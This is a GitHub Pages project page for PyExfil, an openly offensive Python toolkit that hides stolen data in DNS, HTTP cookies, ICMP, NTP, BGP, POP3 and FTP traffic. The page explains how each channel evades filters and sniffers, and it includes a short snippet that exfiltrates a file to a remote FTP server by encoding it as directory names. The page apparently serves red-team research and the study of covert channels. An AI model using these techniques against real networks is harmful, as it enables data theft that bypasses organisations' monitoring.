<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <title>PyExfil by ytisf</title>

    <link rel="stylesheet" href="stylesheets/styles.css">
    <link rel="stylesheet" href="stylesheets/github-light.css">
    <meta name="viewport" content="width=device-width">
    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
  </head>
  <body>
    <div class="wrapper">
      <header>
        <h1>PyExfil</h1>
        <p>A couple of beta stage tools for data exfiltration</p>

        <p class="view"><a href="https://github.com/ytisf/PyExfil">View the Project on GitHub <small>ytisf/PyExfil</small></a></p>


        <ul>
          <li><a href="https://github.com/ytisf/PyExfil/zipball/master">Download <strong>ZIP File</strong></a></li>
          <li><a href="https://github.com/ytisf/PyExfil/tarball/master">Download <strong>TAR Ball</strong></a></li>
          <li><a href="https://github.com/ytisf/PyExfil">View On <strong>GitHub</strong></a></li>
        </ul>
      </header>
      <section>
        <h1>
<a id="pyexfil" class="anchor" href="#pyexfil" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>PyExfil</h1>

<h2>
<a id="abstract" class="anchor" href="#abstract" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Abstract</h2>

<p>This started as a PoC project but has later turned into something a bit more. Currently it's an Alpha-Alpha stage package, not yet tested (and will appriciate any feedbacks and commits) designed to show several techniques of data exfiltration is real world scenarios. Currently here are what the package supports and what is allows is:</p>

<ul>
<li>DNS query.</li>
<li>HTTP Cookie.</li>
<li>ICMP (8).</li>
<li>NTP requests.</li>
<li>BGP Open.</li>
<li>POP3 Authentication (as password) - Idea thanks to <a href="https://github.com/ikotler">Itzik Kotler</a>
</li>
<li>FTP MKDIR technique - Idea thanks to <a href="https://github.com/ikotler">Itzik Kotler</a>
</li>
</ul>

<p>Package is still not really usable and will provide multiple issues. Please wait for a more reliable version to come along. You can track changes at the official <a href="http://ytisf.github.io/PyExfil/">GitHub page</a>.
The release of Symantec's Regin research was the initiator of this module. It is inspired by some of the features of <a href="http://www.symantec.com/connect/blogs/regin-top-tier-espionage-tool-enables-stealthy-surveillance">Regin</a>. Go read about it :)</p>

<h2>
<a id="techniques" class="anchor" href="#techniques" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Techniques</h2>

<h3>
<a id="dns" class="anchor" href="#dns" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>DNS</h3>

<p>This will allow establish of a listener on a DNS server to grab incoming DNS queries. It will then harvest them for files exfiltrated by the client. It <strong>does not</strong> yet allow simultaneous connections and transfers. DNS packets will look good to most listeners and <em>Wireshark</em> and <em>tcpdump</em> (which are the ones that have been tested) will show normal packet and not a 'malformed packet' or anything like that.</p>

<h3>
<a id="http-cookie" class="anchor" href="#http-cookie" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>HTTP Cookie</h3>

<p>Exfiltration of files over HTTP protocol but over the Cookies field. The strong advantage of this is that the cookie field is supposed to be random noise to any listener in the middle and therefore is very difficult to filter.</p>

<h3>
<a id="icmp" class="anchor" href="#icmp" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>ICMP</h3>

<p>Uses ICMP 8 packets (echo request) to add a file payload to it. It reimplemented ICMP ping requests and some sniffers are known to capture it as malformed packets. Wireshark currently displays it as a normal packet.</p>

<h3>
<a id="ftp-mkdir" class="anchor" href="#ftp-mkdir" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>FTP MKDIR</h3>

<p>FTP MKDIR is a technique based on using an FTP server and assuming that the corporate is using an active MiTM to disable file upload. With this in mind, the file is then compressed using <code>zlib</code> and base64 encoded (to be ASCII representable) and then splitted into chunks. Each chunk is then made the name of a directory using MKDIR command (which is not a file upload and should be enabled).
It can be used in the following manner:</p>

<h4>
<a id="file-exfil" class="anchor" href="#file-exfil" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>File Exfil</h4>

<div class="highlight highlight-source-python"><pre><span class="pl-c"># Port is by default 21, but can be changed with 'port=2121'</span>
<span class="pl-c"># Credentials are () but can be added with: creds=('user','pass')</span>
<span class="pl-c"># TLS is disabled by default but could be added with tls=True</span>
FTPexf <span class="pl-k">=</span> FTPExfiltrator(<span class="pl-v">server</span><span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">"</span>10.211.55.15<span class="pl-pds">"</span></span>, <span class="pl-v">file2exfil</span><span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">"</span>/bin/bash<span class="pl-pds">"</span></span>)
FTPexf.get_file_chunks()
FTPexf.build_final_chunks()
FTPexf.send_chunks()</pre></div>

<h4>
<a id="file-reconstruction" class="anchor" href="#file-reconstruction" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>File Reconstruction</h4>

<div class="highlight highlight-source-python"><pre><span class="pl-c"># Directory argument can be added with: dir="/home/user/directory"</span>
FTPHand <span class="pl-k">=</span> GetContent()
FTPHand.get_file()</pre></div>

<h2>
<a id="future-stuff" class="anchor" href="#future-stuff" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Future Stuff</h2>

<h3>
<a id="version-alpha" class="anchor" href="#version-alpha" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Version Alpha</h3>

<ul>
<li>[X] Check why HTTP Cookie exfiltration keeps failing CRC checks. (Fixed in patch #7 by Sheksa)</li>
<li>[X] Add NTP exfiltration. (Thanks to barachy for the idea)</li>
<li>[X] Complete NTP listener.</li>
<li>[X] BGP Data exfiltration + listener.</li>
<li>[X] FTP MKDIR Exfiltrator &amp; combiner.</li>
<li>[ ] Write a proper Documentation.</li>
<li>[ ] Fix that poorly written <em>setup.py</em>.</li>
<li>[ ] More QA needed and fast!</li>
</ul>

<h3>
<a id="version-beta" class="anchor" href="#version-beta" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Version Beta</h3>

<ul>
<li>[ ] Enable simultaneous support for all data exfiltration methods.</li>
<li>[ ] Translate module to C Windows.</li>
<li>[ ] Translate module to C Linux.</li>
<li>[ ] Get a damn logo :)</li>
</ul>

<h2>
<a id="thanks" class="anchor" href="#thanks" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Thanks</h2>

<p>Thanks <a href="http://wireshark.com/">Wireshark</a> for your awesome wiki and tool. Especially <a href="http://wiki.wireshark.org/SampleCaptures">packet dumps</a>.
Thanks to barachy and AM for ideas on protocols to use.</p>
      </section>
      <footer>
        <p>This project is maintained by <a href="https://github.com/ytisf">ytisf</a></p>
        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
      </footer>
    </div>
    <script src="javascripts/scale.fix.js"></script>
              <script type="text/javascript">
            var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
            document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
          </script>
          <script type="text/javascript">
            try {
              var pageTracker = _gat._getTracker("UA-53267734-7");
            pageTracker._trackPageview();
            } catch(err) {}
          </script>

  </body>
</html>
